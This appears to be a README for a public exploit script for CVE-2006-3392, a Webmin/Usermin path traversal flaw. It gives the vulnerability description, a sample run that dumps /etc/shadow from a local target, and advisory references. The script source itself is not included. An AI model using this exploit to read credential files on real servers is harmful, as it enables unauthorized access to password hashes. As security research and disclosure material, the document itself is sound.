# CVE-2006-3392

## Description

Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML, which allows remote attackers to read arbitrary files, as demonstrated using "..%01" sequences, which bypass the removal of "../" sequences before bytes such as "%01" are removed from the filename. NOTE: This is a different issue than CVE-2006-3274.

## Execution
```
$ python3 CVE-2006-3392.py -u http://127.0.0.1:10000


   _______      ________    ___   ___   ___    __       ____ ____   ___ ___  
  / ____\ \    / /  ____|  |__ \ / _ \ / _ \  / /      |___ \___ \ / _ \__ \ 
 | |     \ \  / /| |__ ______ ) | | | | | | |/ /_ ______ __) |__) | (_) | ) |
 | |      \ \/ / |  __|______/ /| | | | | | | '_ \______|__ <|__ < \__, |/ / 
 | |____   \  /  | |____    / /_| |_| | |_| | (_) |     ___) |__) |  / // /_ 
  \_____|   \/   |______|  |____|\___/ \___/ \___/     |____/____/  /_/|____|

                              [Coded by MrEmpy]

[*] File path: /etc/shadow
root:[REDACTED]:17406:0:99999:7:::
daemon:*:17047:0:99999:7:::
bin:*:17047:0:99999:7:::
sys:*:17047:0:99999:7:::
sync:*:17047:0:99999:7:::
games:*:17047:0:99999:7:::
man:*:17047:0:99999:7:::
lp:*:17047:0:99999:7:::
mail:*:17047:0:99999:7:::
news:*:17047:0:99999:7:::
uucp:*:17047:0:99999:7:::
proxy:*:17047:0:99999:7:::
www-data:*:17047:0:99999:7:::
backup:*:17047:0:99999:7:::
list:*:17047:0:99999:7:::
irc:*:17047:0:99999:7:::
gnats:*:17047:0:99999:7:::
nobody:*:17047:0:99999:7:::
libuuid:!:17047:0:99999:7:::
Debian-exim:!:17047:0:99999:7:::
statd:*:17047:0:99999:7:::
sshd:*:17047:0:99999:7:::
mysql:!:17047:0:99999:7:::
proftpd:!:17406:0:99999:7:::
ftp:*:17406:0:99999:7:::
webmaster:[REDACTED]:17406:0:99999:7:::
```

## References
* https://nvd.nist.gov/vuln/detail/CVE-2006-3392
* http://attrition.org/pipermail/vim/2006-July/000923.html
* http://attrition.org/pipermail/vim/2006-June/000912.html
* http://secunia.com/advisories/20892
* http://secunia.com/advisories/21105
* http://secunia.com/advisories/21365
* http://secunia.com/advisories/22556
* http://security.gentoo.org/glsa/glsa-200608-11.xml
* http://www.debian.org/security/2006/dsa-1199
* http://www.kb.cert.org/vuls/id/999601
* http://www.mandriva.com/security/advisories?name=MDKSA-2006:125
* http://www.osvdb.org/26772
* http://www.securityfocus.com/archive/1/439653/100/0/threaded
* http://www.securityfocus.com/archive/1/440125/100/0/threaded
* http://www.securityfocus.com/archive/1/440466/100/0/threaded
* http://www.securityfocus.com/archive/1/440493/100/0/threaded
* http://www.securityfocus.com/bid/18744
* http://www.vupen.com/english/advisories/2006/2612
* http://www.webmin.com/changes.html
